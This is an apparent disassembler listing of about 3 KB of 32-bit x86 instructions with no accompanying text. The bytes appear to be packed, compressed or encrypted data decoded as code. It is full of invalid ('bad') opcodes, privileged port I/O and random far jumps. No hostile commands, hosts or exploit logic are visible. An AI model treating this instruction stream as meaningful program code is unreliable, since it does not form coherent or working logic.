  418ddc:	fld    DWORD PTR [esi-0x57]
  418ddf:	sub    dh,0x55
  418de2:	out    0x8a,al
  418de4:	xlat   BYTE PTR ds:[ebx]
  418de5:	stos   DWORD PTR es:[edi],eax
  418de6:	ins    DWORD PTR es:[edi],dx
  418de7:	dec    esp
  418de8:	(bad)  [ebx]
  418dea:	mov    bl,0x5e
  418dec:	sbb    BYTE PTR [eax+0x50e564f5],dl
  418df2:	aaa    
  418df3:	aaa    
  418df4:	sbb    DWORD PTR [esp+ebx*1],0x59
  418df8:	mov    bl,0xe
  418dfa:	pusha  
  418dfb:	xor    BYTE PTR [ebx],ch
  418dfd:	enter  0xb9c,0x33
  418e01:	mov    ah,BYTE PTR ds:0x64609de2
  418e07:	pop    esp
  418e08:	lock cmp al,BYTE PTR [ecx+0x168bc5a6]
  418e0f:	add    al,0xba
  418e11:	xor    BYTE PTR [ecx],dh
  418e13:	aaa    
  418e14:	sbb    edi,DWORD PTR [ebx-0x34]
  418e17:	ret    0x4e2c
  418e1a:	ins    DWORD PTR es:[edi],dx
  418e1b:	prefetch BYTE PTR [edi+0x6d1f444a]
  418e22:	cmc    
  418e23:	dec    edx
  418e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e25:	xchg   edx,eax
  418e26:	lds    ebx,FWORD PTR [ecx+edx*4-0x61]
  418e2a:	jmp    0x418e73
  418e2c:	cs out dx,al
  418e2e:	retf   0xfff7
  418e31:	retf   
  418e32:	pop    ds
  418e33:	test   al,0xe4
  418e35:	dec    esp
  418e36:	rcr    DWORD PTR [ecx+eiz*2],1
  418e39:	sbb    eax,0xc7d5f753
  418e3e:	test   DWORD PTR [eax],esp
  418e40:	cs daa 
  418e42:	dec    DWORD PTR [esp+eax*2]
  418e45:	sbb    ebx,DWORD PTR [edx+0x1]
  418e48:	or     BYTE PTR [edx+esi*1+0x60],0xdf
  418e4d:	pop    edi
  418e4e:	loopne 0x418e85
  418e50:	into   
  418e51:	mov    dl,0xd1
  418e53:	xchg   edx,eax
  418e54:	cmp    eax,0x74d5a87d
  418e59:	stc    
  418e5a:	call   0xf973:0xe9266556
  418e61:	push   ebp
  418e62:	fiadd  WORD PTR [edi]
  418e64:	shl    BYTE PTR [edi+0x22],1
  418e67:	mov    al,ds:0x5c5273
  418e6c:	and    DWORD PTR [edx-0x60f8ea26],eax
  418e72:	fiadd  DWORD PTR [edx]
  418e74:	test   eax,0x810599cb
  418e79:	sub    ebx,ebp
  418e7b:	push   esi
  418e7c:	dec    ecx
  418e7d:	loopne 0x418e0d
  418e7f:	fisttp WORD PTR [edx-0x2f]
  418e82:	fadd   DWORD PTR [esi]
  418e84:	and    eax,0x9a4e7d00
  418e89:	fiadd  WORD PTR [edi+eax*4+0x153c728c]
  418e90:	mov    dh,0x14
  418e92:	std    
  418e93:	add    al,0xe1
  418e95:	(bad)  
  418e96:	(bad)  
  418e98:	inc    edi
  418e99:	inc    ebx
  418e9a:	jle    0x418ee5
  418e9c:	push   ds
  418e9d:	pushf  
  418e9e:	inc    esi
  418e9f:	cdq    
  418ea0:	ins    BYTE PTR es:[edi],dx
  418ea1:	lods   al,BYTE PTR ds:[esi]
  418ea2:	push   edx
  418ea3:	ja     0x418e36
  418ea5:	lock pusha 
  418ea7:	cmp    eax,0x7dd74f7b
  418eac:	rol    bl,1
  418eae:	aad    0x16
  418eb0:	mov    cl,BYTE PTR [edi+eiz*4-0x62]
  418eb4:	dec    ecx
  418eb5:	inc    ebx
  418eb6:	cmc    
  418eb7:	push   cs
  418eb8:	mov    bh,0xd5
  418eba:	stc    
  418ebb:	push   ebx
  418ebc:	cs jno 0x418eb6
  418ebf:	adc    eax,0x67fcfb05
  418ec4:	cmp    DWORD PTR [esi-0x1f],edi
  418ec7:	adc    DWORD PTR [edx],edi
  418ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418eca:	outs   dx,BYTE PTR ds:[esi]
  418ecb:	xor    BYTE PTR [esi],al
  418ecd:	mov    esp,0x62768e99
  418ed2:	mov    cl,0xef
  418ed4:	lock sub eax,0xb8e51890
  418eda:	mov    edi,0xda977f9a
  418edf:	sub    DWORD PTR [esi+0x2a37783c],esi
  418ee5:	mov    dh,0xee
  418ee7:	out    dx,al
  418ee8:	jp     0x418f52
  418eea:	dec    BYTE PTR [ebp+0x9]
  418eed:	mov    ebp,DWORD PTR [ebp-0x9]
  418ef0:	sbb    eax,0xb643e02c
  418ef5:	add    al,0xb4
  418ef7:	sbb    esi,DWORD PTR [esi+edi*2+0x9ccdd5c]
  418efe:	add    ah,BYTE PTR [edi-0x71]
  418f01:	icebp  
  418f02:	aaa    
  418f03:	fwait
  418f04:	shl    BYTE PTR [edx+0x47],1
  418f07:	or     BYTE PTR [ebx-0x30ef5cee],al
  418f0d:	push   ebx
  418f0e:	jno    0x418e9e
  418f10:	call   0xb767389f
  418f15:	pop    esi
  418f16:	in     al,0xf9
  418f18:	mov    dh,0x33
  418f1a:	retf   0x8cfd
  418f1d:	jle    0x418efe
  418f1f:	iret   
  418f20:	cmp    dh,bl
  418f22:	adc    ebx,DWORD PTR [eax]
  418f24:	popf   
  418f25:	icebp  
  418f26:	setae  BYTE PTR [ecx]
  418f29:	sbb    BYTE PTR [edx-0x73970af2],dh
  418f2f:	lahf   
  418f30:	pop    ss
  418f31:	sub    ch,BYTE PTR [edi]
  418f33:	xchg   ebx,eax
  418f34:	mov    ah,0xea
  418f36:	add    eax,0x9e2c5773
  418f3b:	out    0xc5,al
  418f3d:	push   edi
  418f3e:	dec    edx
  418f3f:	dec    eax
  418f40:	sub    bh,0x1f
  418f43:	sbb    edi,edx
  418f45:	loopne 0x418f2b
  418f47:	or     bh,BYTE PTR [ecx+0x5bbbf780]
  418f4d:	sbb    DWORD PTR [eax-0x4dd55ac3],ecx
  418f53:	cwde   
  418f54:	dec    eax
  418f55:	rcr    DWORD PTR [eax+0xd],cl
  418f58:	aas    
  418f59:	dec    ebp
  418f5a:	jbe    0x418f9c
  418f5c:	mov    dh,0x7b
  418f5e:	mov    dl,0x9a
  418f60:	pop    es
  418f61:	xchg   ecx,eax
  418f62:	std    
  418f63:	jmp    0x5d37b491
  418f68:	xchg   esi,eax
  418f69:	int    0x58
  418f6b:	add    al,0xf4
  418f6d:	mov    cl,0x48
  418f6f:	add    cl,ah
  418f71:	and    DWORD PTR [edx+eax*1+0x22a15be8],0xe9a7bfa9
  418f7c:	xor    BYTE PTR [esi],0x52
  418f7f:	add    dl,BYTE PTR [edi]
  418f81:	jnp    0x418f1a
  418f83:	lods   al,BYTE PTR ds:[esi]
  418f84:	xor    cl,ch
  418f86:	jmp    0x418f20
  418f88:	cdq    
  418f89:	pop    ss
  418f8a:	xor    edi,DWORD PTR [edi+0x68]
  418f8d:	or     al,0xa0
  418f8f:	int3   
  418f90:	fucomip st,st(4)
  418f92:	iret   
  418f93:	xor    DWORD PTR [esi-0x427fc2d6],ebx
  418f99:	jmp    0x418f92
  418f9b:	xchg   esp,eax
  418f9c:	cmp    eax,0x7d0a4817
  418fa1:	and    DWORD PTR [eax-0x231ba266],esp
  418fa7:	inc    ebp
  418fa8:	xchg   esp,eax
  418fa9:	pop    ebx
  418faa:	hlt    
  418fab:	add    eax,0x2659aaa5
  418fb0:	iret   
  418fb1:	add    al,0x8d
  418fb4:	cmp    BYTE PTR [eax],dh
  418fb6:	pop    ecx
  418fb7:	sbb    al,0x55
  418fb9:	mov    BYTE PTR [esi-0x7c976c13],cl
  418fbf:	jno    0x418ff7
  418fc1:	ret    
  418fc2:	pop    edi
  418fc3:	into   
  418fc4:	sbb    DWORD PTR [edi+0x5b],ebp
  418fc7:	sbb    DWORD PTR [ecx+0x2fb993c5],esp
  418fcd:	outs   dx,BYTE PTR ds:[esi]
  418fce:	xchg   DWORD PTR [edi],ebp
  418fd0:	popf   
  418fd1:	out    0x5b,eax
  418fd3:	mov    ?,WORD PTR [edx-0x46fc5853]
  418fd9:	fwait
  418fda:	push   0xffffffaf
  418fdc:	jmp    0xe64f:0x82a85551
  418fe3:	xchg   ebp,eax
  418fe4:	cmp    cl,BYTE PTR [ebx-0x2db3348]
  418fea:	or     esp,0xade7390
  418ff0:	add    esp,DWORD PTR [edi]
  418ff2:	aam    0xa2
  418ff4:	add    DWORD PTR [ebp-0x51],ebx
  418ff7:	push   esp
  418ff8:	dec    ecx
  418ff9:	stos   DWORD PTR es:[edi],eax
  418ffa:	push   ebp
  418ffb:	rol    ch,0x7a
  418ffe:	rcr    DWORD PTR [ebx],cl
  419000:	jb     0x41905d
  419002:	sub    ebx,ecx
  419004:	mov    edi,0xd9e36710
  419009:	inc    ebp
  41900a:	jecxz  0x419068
  41900c:	in     eax,0x4
  41900e:	or     bl,BYTE PTR [esi]
  419010:	ret    
  419011:	stos   BYTE PTR es:[edi],al
  419012:	mov    edi,0x1c2e6b2a
  419017:	sar    DWORD PTR [esp+ebp*4],0xe2
  41901b:	stos   DWORD PTR es:[edi],eax
  41901c:	push   esi
  41901d:	xor    DWORD PTR [edx],edi
  41901f:	sbb    eax,0x22723eed
  419024:	adc    DWORD PTR [edx],ebx
  419026:	inc    ecx
  419027:	jns    0x419056
  419029:	mov    dl,0x2a
  41902b:	mov    edx,fs
  41902d:	imul   esp,DWORD PTR [esi-0x9],0x89abefe9
  419034:	mov    WORD PTR [esi],ds
  419036:	rol    DWORD PTR [eax+esi*4],cl
  419039:	xchg   edi,eax
  41903a:	cmp    DWORD PTR [edx+0x51],esi
  41903d:	mov    esi,0x2e2b43c5
  419042:	int    0xcd
  419044:	mov    ebx,0x3caf9a78
  419049:	mov    ah,0x31
  41904b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41904c:	add    DWORD PTR [ebx],0x9e2e4a9d
  419052:	jbe    0x418fda
  419054:	in     al,0xbe
  419056:	or     BYTE PTR [ebx-0x6e],0x39
  41905a:	clc    
  41905b:	call   0xb672:0xbba0c83d
  419062:	xchg   edx,eax
  419063:	jae    0x4190b3
  419065:	dec    edi
  419066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419067:	or     eax,0x18e0ece
  41906c:	jecxz  0x4190ca
  41906e:	push   cs
  41906f:	mov    edx,0x69f276b5
  419074:	enter  0x9f71,0xcd
  419078:	sbb    DWORD PTR fs:[ebx+0xb],esp
  41907c:	push   ebp
  41907d:	push   0x7
  41907f:	and    eax,0x69203916
  419084:	mov    edi,0x5c8545e8
  419089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41908a:	cmp    ebx,eax
  41908c:	push   cs
  41908d:	out    0x2b,al
  41908f:	int3   
  419090:	xor    eax,0x5e3e97b
  419095:	add    eax,0x303f87cb
  41909a:	(bad)  
  41909b:	cmc    
  41909c:	gs into 
  41909e:	xor    al,0x3f
  4190a0:	xchg   esp,eax
  4190a1:	mov    dl,0xec
  4190a3:	add    edx,ecx
  4190a5:	and    al,0x2e
  4190a7:	stc    
  4190a8:	adc    eax,0x35baea64
  4190ad:	and    ebp,DWORD PTR [edi+0xa5656c8]
  4190b3:	lds    esp,FWORD PTR [esi+eiz*8+0x261f3e07]
  4190ba:	add    BYTE PTR [esi+0x38],0x78
  4190be:	mov    edi,0x7445e273
  4190c3:	std    
  4190c4:	(bad)  
  4190c6:	push   0x2bcc8deb
  4190cb:	add    BYTE PTR [esi+edi*1],0x1d
  4190cf:	mov    ebp,0x829311ad
  4190d4:	fst    DWORD PTR [edi]
  4190d6:	or     BYTE PTR [ebp-0x75],ah
  4190d9:	mov    ebp,0x2c0d16f9
  4190de:	sahf   
  4190df:	icebp  
  4190e0:	ja     0x419100
  4190e2:	dec    edx
  4190e3:	and    eax,0x3e9d5c24
  4190e9:	sub    ebx,esp
  4190eb:	push   ss
  4190ec:	add    BYTE PTR ds:0x3d1ae,ah
  4190f2:	retf   0x6bfc
  4190f5:	mov    ?,WORD PTR [edi+0x64]
  4190f8:	jmp    0x4190dc
  4190fa:	in     eax,0xb8
  4190fc:	add    eax,0xce09e156
  419101:	mov    ah,0x4b
  419103:	dec    ebp
  419104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419105:	icebp  
  419106:	xchg   esp,eax
  419107:	cmp    BYTE PTR [edx+edx*4-0x7a579c65],cl
  41910e:	sbb    DWORD PTR [edi+0x1e7888cd],edi
  419114:	inc    esp
  419115:	in     eax,0xc1
  419117:	xor    al,0xeb
  419119:	inc    ebx
  41911a:	cs loope 0x4190ce
  41911d:	xor    edx,DWORD PTR [esp+ebx*8]
  419120:	addr16 add al,0x7d
  419123:	jge    0x419193
  419125:	add    BYTE PTR [edx-0x36],dh
  419128:	pop    esp
  419129:	call   0xe6fe6333
  41912e:	lahf   
  41912f:	cmp    DWORD PTR ds:0xdf4f0482,esp
  419135:	stos   BYTE PTR es:[edi],al
  419136:	xor    dl,BYTE PTR ss:[edi-0x3d]
  41913a:	mov    cs,ecx
  41913c:	ins    DWORD PTR es:[edi],dx
  41913d:	(bad)  
  41913e:	or     eax,0x87040644
  419143:	push   ebp
  419144:	inc    ebp
  419145:	clc    
  419146:	and    ebp,ebx
  419148:	arpl   WORD PTR [edx+0x65],sp
  41914b:	pop    esp
  41914c:	or     al,dh
  41914e:	shr    DWORD PTR [esp+eiz*4+0x42],1
  419152:	ins    BYTE PTR es:[edi],dx
  419153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419154:	sub    eax,0x9f62ae62
  419159:	sbb    eax,0x763cd6b7
  41915e:	mov    dh,0xae
  419160:	test   eax,0x18b027f3
  419165:	jp     0x419187
  419167:	mov    ecx,0x45ec9019
  41916c:	mov    ecx,0xdfcdb89d
  419171:	push   esi
  419172:	adc    al,0xbe
  419174:	mov    bh,BYTE PTR [esi]
  419176:	add    DWORD PTR [ecx-0x3363a93c],eax
  41917c:	jno    0x41917f
  41917e:	dec    ebp
  41917f:	push   ebx
  419180:	add    al,0xf0
  419182:	aam    0x97
  419184:	shl    BYTE PTR [edi-0x68],cl
  419187:	out    0xee,al
  419189:	in     eax,dx
  41918a:	pop    edi
  41918b:	fnstcw WORD PTR [eax]
  41918d:	jg     0x419153
  41918f:	fimul  DWORD PTR [esi-0x1861a269]
  419195:	and    esi,edi
  419197:	adc    DWORD PTR [ebx-0x46],eax
  41919a:	pop    eax
  41919b:	jne    0x419138
  41919d:	cmp    BYTE PTR [ebx-0x26],0xd0
  4191a1:	xor    eax,0xf26cb794
  4191a6:	das    
  4191a7:	xor    BYTE PTR [ecx+0x67],dh
  4191aa:	enter  0xe1f9,0x4e
  4191ae:	mov    ah,0xe6
  4191b0:	jmp    0x7232377a
  4191b5:	not    DWORD PTR [esi]
  4191b7:	shl    ebp,1
  4191b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ba:	mov    ds:0x3240ea17,al
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	xchg   DWORD PTR [ebp+0x274487f4],edx
  4191c6:	lock cmp cl,BYTE PTR [eax-0x2d]
  4191ca:	inc    esi
  4191cb:	xor    eax,0x36785b54
  4191d0:	shl    BYTE PTR [esi-0x59461d12],cl
  4191d6:	repz out dx,al
  4191d8:	rcr    DWORD PTR [edx-0x3246099e],0x16
  4191df:	test   eax,0x19aed98d
  4191e4:	mov    al,ds:0xa5a47dd6
  4191e9:	mov    al,0x50
  4191eb:	lods   eax,DWORD PTR ds:[esi]
  4191ec:	jne    0x4191d3
  4191ee:	jmp    0xc417:0xaa24b4eb
  4191f5:	sti    
  4191f6:	xor    ah,bh
  4191f8:	les    ebx,FWORD PTR [edi]
  4191fa:	push   esi
  4191fb:	js     0x419194
  4191fd:	sub    dl,BYTE PTR [esi+0x5fb4ee19]
  419203:	mov    esi,0xc621c3b2
  419208:	xchg   BYTE PTR [edi+0x34],al
  41920b:	iret   
  41920c:	addr16 mov edi,0x1bf60c08
  419212:	add    BYTE PTR [edi-0x13cdd2a1],dl
  419218:	jmp    0x5cfbce2b
  41921d:	ins    BYTE PTR es:[edi],dx
  41921e:	es ja  0x4191f7
  419221:	push   ebx
  419222:	mov    esi,0xb5bc0b8a
  419227:	sbb    BYTE PTR [ecx+0x649e6bc5],bl
  41922d:	gs jne 0x419212
  419230:	jbe    0x4191c7
  419232:	inc    edi
  419233:	js     0x419236
  419235:	and    eax,0xf13d0b07
  41923a:	das    
  41923b:	sbb    DWORD PTR [edx-0x4a4e3dbe],0xffffff82
  419242:	sahf   
  419243:	pop    ebp
  419244:	jl     0x419226
  419246:	xchg   edx,eax
  419247:	xchg   DWORD PTR [esi-0x48],esp
  41924a:	cs test al,0x60
  41924d:	pop    eax
  41924e:	stos   BYTE PTR es:[edi],al
  41924f:	mov    dh,0x26
  419251:	rcl    BYTE PTR [ebx+edx*8],0xb3
  419255:	push   ecx
  419256:	dec    edx
  419257:	scas   eax,DWORD PTR es:[edi]
  419258:	es push edx
  41925a:	jnp    0x419295
  41925c:	jg     0x4191ec
  41925e:	xor    BYTE PTR [ebx-0x258c7109],ch
  419264:	cmp    al,0xed
  419266:	aam    0x17
  419268:	sub    bh,bh
  41926a:	or     BYTE PTR [esi],bl
  41926c:	icebp  
  41926d:	outs   dx,BYTE PTR ds:[esi]
  41926e:	xor    BYTE PTR [edx-0x7107d31d],ch
  419274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419275:	scas   al,BYTE PTR es:[edi]
  419276:	loopne 0x4192c3
  419278:	cmp    eax,0x2596d1d1
  41927d:	(bad)
  419280:	nop
  419281:	jle    0x419237
  419283:	iret   
  419284:	sub    dh,cl
  419286:	sar    DWORD PTR [ebx],cl
  419288:	sbb    esp,ebp
  41928a:	aas    
  41928b:	dec    edi
  41928c:	in     eax,dx
  41928d:	dec    ebp
  41928e:	ds jo  0x419309
  419291:	fistp  QWORD PTR [ebp+0x2c]
  419294:	or     bl,BYTE PTR [edx-0x57bbb75d]
  41929a:	stc    
  41929b:	es jmp 0x419301
  41929e:	in     eax,dx
  41929f:	jmp    0x8ccf:0xa39391eb
  4192a6:	mov    al,0x7
  4192a8:	inc    edx
  4192a9:	dec    ebx
  4192aa:	mov    al,ds:0x22ca041a
  4192af:	sahf   
  4192b0:	mov    edx,0x42047959
  4192b5:	mov    eax,ds:0x8cc832a
  4192ba:	mov    BYTE PTR [esi-0x31070063],cl
  4192c0:	mov    esi,0x184aee4
  4192c5:	jg     0x41926c
  4192c7:	aaa    
  4192c8:	push   cs
  4192c9:	lds    edi,FWORD PTR [ecx]
  4192cb:	or     al,0x94
  4192cd:	cli    
  4192ce:	or     eax,DWORD PTR [eax-0x62367c2b]
  4192d4:	xor    BYTE PTR [edi+0x483b96c9],bl
  4192da:	call   FWORD PTR [ebx]
  4192dc:	dec    ebx
  4192dd:	and    BYTE PTR [eax],bh
  4192df:	ss mov dh,0xce
  4192e2:	inc    eax
  4192e3:	xor    DWORD PTR [ebx-0x4d],esi
  4192e6:	mov    ah,0xdf
  4192e8:	jmp    0x8c5:0x53a3cec6
  4192ef:	inc    ecx
  4192f0:	mov    edi,0xe24757d9
  4192f5:	mov    ds:0x1026cd14,eax
  4192fa:	test   eax,0x575ba21a
  4192ff:	cmp    al,0xc2
  419301:	dec    eax
  419302:	mov    dl,0x98
  419304:	xchg   ecx,eax
  419305:	and    al,0x6b
  419307:	stc    
  419308:	rol    ebx,cl
  41930a:	jo     0x419334
  41930c:	mov    ch,0x44
  41930e:	push   ecx
  41930f:	jmp    0x419302
  419311:	pop    eax
  419312:	cmc    
  419313:	mov    ebp,0xbd1c6c1
  419318:	repz (bad) 
  41931a:	(bad)  
  41931c:	sub    bl,bh
  41931e:	aas    
  41931f:	das    
  419320:	cmp    ah,BYTE PTR ds:0xad3a9b33
  419326:	stc    
  419327:	pop    esi
  419328:	pop    ds
  419329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41932a:	add    BYTE PTR [ecx+0x45],dl
  41932d:	xor    bl,BYTE PTR [ecx+0x59dbe1aa]
  419333:	add    al,0x0
  419335:	or     edx,DWORD PTR [ebx-0xb]
  419338:	imul   ecx,DWORD PTR [ecx+eiz*2+0xbebd6c8],0x9e982389
  419343:	mov    BYTE PTR [ebx],ah
  419345:	fs mov cl,0xb1
  419348:	dec    ecx
  419349:	xor    ah,BYTE PTR [ecx+eax*4+0x17a56dad]
  419350:	xor    BYTE PTR [ebp-0x20988f77],ah
  419356:	imul   ebp,edi,0xf5773bff
  41935c:	cmp    bl,dh
  41935e:	mov    BYTE PTR [edi],bh
  419360:	popa   
  419361:	push   esi
  419362:	xchg   esp,eax
  419363:	jmp    0x41935c
  419365:	mov    al,ds:0x42c36b1f
  41936a:	xchg   edx,eax
  41936b:	outs   dx,BYTE PTR ds:[esi]
  41936c:	repnz adc ah,BYTE PTR [eax-0x5a]
  419370:	imul   ecx,DWORD PTR ss:[edx+0x1f],0x9f0e522d
  419378:	adc    dh,ch
  41937a:	clc    
  41937b:	repz aas 
  41937d:	mov    edx,0x398f5e3
  419382:	inc    esi
  419383:	add    dl,BYTE PTR [ecx]
  419385:	xor    al,0x60
  419387:	into   
  419388:	mov    eax,ds:0x23243c1f
  41938d:	test   BYTE PTR [edi],0xd8
  419390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419391:	cmp    esi,DWORD PTR [esi+0x2d]
  419394:	mov    dh,0xd0
  419396:	push   cs
  419397:	daa    
  419398:	(bad)  
  419399:	gs (bad) 
  41939b:	xlat   BYTE PTR ds:[ebx]
  41939c:	mov    al,0x81
  41939e:	(bad)  
  41939f:	out    dx,eax
  4193a0:	ins    DWORD PTR es:[edi],dx
  4193a1:	pop    ecx
  4193a2:	retf   
  4193a3:	add    BYTE PTR [edx-0x313ffc2],bh
  4193a9:	cwde   
  4193aa:	mov    cl,0xc9
  4193ac:	in     eax,dx
  4193ad:	push   ss
  4193ae:	jo     0x41941f
  4193b0:	xchg   edx,eax
  4193b1:	sub    esp,DWORD PTR [esi+0x5cb2fc3a]
  4193b7:	je     0x419426
  4193b9:	cmp    ebp,DWORD PTR [edi+ebp*1]
  4193bc:	xchg   BYTE PTR ds:0xd93e8a31,cl
  4193c2:	aaa    
  4193c3:	fcmovb st,st(7)
  4193c5:	and    al,0x93
  4193c7:	push   0xafb1893d
  4193cc:	lahf   
  4193cd:	inc    esi
  4193ce:	imul   eax,ecx,0xd294a5d9
  4193d4:	pop    ecx
  4193d5:	jecxz  0x4193dc
  4193d7:	out    dx,eax
  4193d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d9:	mov    al,0x69
  4193db:	xlat   BYTE PTR ds:[ebx]
  4193dc:	test   BYTE PTR ds:0xbda61a0e,dl
  4193e2:	lods   al,BYTE PTR ds:[esi]
  4193e3:	fdiv   QWORD PTR [edi-0x28d40c44]
  4193e9:	xchg   BYTE PTR [edx-0x20],ch
  4193ec:	shl    BYTE PTR [eax+0x17],cl
  4193ef:	ret    
  4193f0:	or     esp,edi
  4193f2:	push   esp
  4193f3:	lahf   
  4193f4:	sbb    bl,BYTE PTR [eax]
  4193f6:	sub    esi,ecx
  4193f8:	inc    esp
  4193f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193fa:	pop    es
  4193fb:	enter  0xf03f,0xa3
  4193ff:	push   esi
  419400:	inc    eax
  419401:	ret    
  419402:	test   DWORD PTR [edi+0x58e8c664],0x26c51ab9
  41940c:	shr    DWORD PTR [esi+0x2],0x77
  419410:	push   ss
  419411:	sbb    edx,edi
  419413:	das    
  419414:	imul   sp,WORD PTR [edi-0x72],0x20c5
  41941a:	mov    eax,0xc092804
  41941f:	rcr    BYTE PTR [esi-0x794edb0f],0x26
  419426:	push   cs
  419427:	aad    0xe7
  419429:	cmp    BYTE PTR fs:[ebp-0x29],dh
  41942d:	ins    BYTE PTR es:[edi],dx
  41942e:	sbb    eax,eax
  419430:	scas   al,BYTE PTR es:[edi]
  419431:	std    
  419432:	mov    WORD PTR [ecx-0x69be9c77],?
  419438:	push   edx
  419439:	mov    ah,0x8e
  41943b:	adc    eax,0x8fc1e48b
  419440:	(bad)  
  419441:	(bad)  
  419443:	cmovs  esi,DWORD PTR [ecx-0x2ae467d1]
  41944a:	enter  0x9542,0xf5
  41944e:	imul   ecx,DWORD PTR [ecx+ebx*1],0x26f9fa3d
  419455:	jae    0x419412
  419457:	icebp  
  419458:	cs icebp 
  41945a:	jae    0x419489
  41945c:	push   ebp
  41945d:	xchg   edx,eax
  41945e:	mov    al,ds:0x5f5b012d
  419463:	in     al,0xd1
  419465:	push   0xffffffd4
  419467:	pop    esp
  419468:	div    bh
  41946a:	mov    ah,0x33
  41946c:	stos   DWORD PTR es:[edi],eax
  41946d:	in     eax,0x43
  41946f:	dec    ecx
  419470:	jg     0x41940d
  419472:	mov    ah,0xb5
  419474:	stos   BYTE PTR es:[edi],al
  419475:	imul   ecx,DWORD PTR [edx+ebp*2],0xcd1ca7c3
  41947c:	mov    ecx,0x1b2f4117
  419481:	sbb    eax,0x844d6aa5
  419486:	or     al,0x3e
  419488:	pop    ebp
  419489:	dec    edi
  41948a:	add    DWORD PTR [edi],ecx
  41948c:	mov    cl,0x3
  41948e:	mov    esp,0x64838a30
  419493:	mov    al,ds:0x528d5b8e
  419498:	and    BYTE PTR [eax-0x27],ch
  41949b:	out    dx,eax
  41949c:	xchg   esp,eax
  41949d:	or     DWORD PTR [eax+0x4417d670],esp
  4194a3:	loopne 0x4194b3
  4194a5:	xchg   BYTE PTR [esi-0x163fb8f1],bh
  4194ab:	pop    ebp
  4194ac:	mov    WORD PTR [edx-0x31],ds
  4194af:	clc    
  4194b0:	xchg   edi,eax
  4194b1:	aad    0xa3
  4194b3:	cmp    BYTE PTR [ecx],cl
  4194b5:	mov    ebp,0x22e7e81b
  4194ba:	xor    DWORD PTR [ebp*8-0x613bc965],edi
  4194c1:	sub    dh,BYTE PTR [edi]
  4194c3:	jl     0x4194c3
  4194c5:	in     eax,dx
  4194c6:	and    dh,BYTE PTR [edx+0x64859771]
  4194cc:	xor    BYTE PTR [edx],bh
  4194ce:	pop    esi
  4194cf:	push   0xb478905c
  4194d4:	adc    DWORD PTR [ecx],ecx
  4194d6:	test   ah,0xa2
  4194d9:	or     eax,ebp
  4194db:	cmp    ch,BYTE PTR [edx-0x36]
  4194de:	cmp    ebp,DWORD PTR [edx]
  4194e0:	sbb    DWORD PTR [edx+0x760863c9],0x63
  4194e7:	cwde   
  4194e8:	add    al,0xc
  4194ea:	mov    ebx,0xf3d54b14
  4194ef:	mov    bl,dh
  4194f1:	daa    
  4194f2:	adc    al,0x92
  4194f4:	pusha  
  4194f5:	jg     0x2ae67212
  4194fb:	and    eax,0xbe674fd
  419500:	test   al,0xb5
  419502:	sahf   
  419503:	fs sbb eax,0x82745ea5
  419509:	xor    cl,dh
  41950b:	inc    ebx
  41950c:	bound  ebp,QWORD PTR [edi]
  41950e:	dec    ebp
  41950f:	popaw  
  419511:	mov    ds:0xe19b51d2,eax
  419516:	xchg   esp,eax
  419517:	(bad)  [esi+0x6b]
  41951a:	les    eax,FWORD PTR [ebx+ebp*4]
  41951d:	lds    edi,FWORD PTR [edi+0x1e]
  419520:	or     al,0x7e
  419522:	jge    0x4194a4
  419524:	jp     0x4195a3
  419526:	inc    BYTE PTR [esi+0x47]
  419529:	xlat   BYTE PTR ds:[ebx]
  41952a:	into   
  41952b:	cmp    eax,0xdf1a13a2
  419530:	ins    DWORD PTR es:[edi],dx
  419531:	std    
  419532:	jmp    0x4194e6
  419534:	test   ebp,ecx
  419536:	inc    ebp
  419537:	sbb    ebp,DWORD PTR [eax-0x2b470218]
  41953d:	sbb    al,0x2f
  41953f:	pop    ss
  419540:	dec    esi
  419541:	jbe    0x4195b9
  419543:	sub    edi,DWORD PTR [ebx-0x7ff48bd9]
  419549:	push   ebp
  41954a:	cli    
  41954b:	sbb    ecx,esp
  41954d:	imul   ebp,DWORD PTR [ebp-0x67656027],0xb74dc25e
  419557:	pop    edx
  419558:	xchg   esi,eax
  419559:	lods   al,BYTE PTR ds:[esi]
  41955a:	dec    ebp
  41955b:	jmp    0x7a8a:0x6d555b95
  419562:	jge    0x419566
  419564:	jb     0x4194fe
  419566:	ja     0x419538
  419568:	push   esi
  419569:	fucomip st,st(5)
  41956b:	pop    edi
  41956c:	fs daa 
  41956e:	int    0xb7
  419570:	mov    ch,0x26
  419572:	or     eax,0x88490503
  419577:	inc    esi
  419578:	mov    ch,0x7a
  41957a:	stos   DWORD PTR es:[edi],eax
  41957b:	dec    edx
  41957c:	adc    cl,ch
  41957e:	stos   BYTE PTR es:[edi],al
  41957f:	icebp  
  419580:	jmp    0xacb:0xaec7dd0b
  419587:	jmp    0x91b9:0x61a9ffd5
  41958e:	es leave 
  419590:	jnp    0x41951c
  419592:	sahf   
  419593:	mov    ecx,0x9ff57840
  419598:	dec    ebx
  419599:	adc    eax,0xc70f9d93
  41959e:	sbb    al,BYTE PTR [eax+eax*1-0x3db4460e]
  4195a5:	mov    ecx,0xccdaa63d
  4195aa:	push   edi
  4195ab:	xlat   BYTE PTR ds:[ebx]
  4195ac:	push   ds
  4195ad:	scas   al,BYTE PTR es:[edi]
  4195ae:	xchg   ebp,eax
  4195af:	mov    ecx,0x9f7cc035
  4195b4:	push   cs
  4195b5:	ins    DWORD PTR es:[edi],dx
  4195b6:	pop    eax
  4195b7:	adc    DWORD PTR [ebx],esi
  4195b9:	or     ebx,esi
  4195bb:	sahf   
  4195bc:	retf   0x2051
  4195bf:	cs jmp 0x419554
  4195c2:	push   0xffffffec
  4195c4:	je     0x419578
  4195c6:	out    dx,al
  4195c7:	add    DWORD PTR [edx-0x57dc85a7],edx
  4195cd:	lahf   
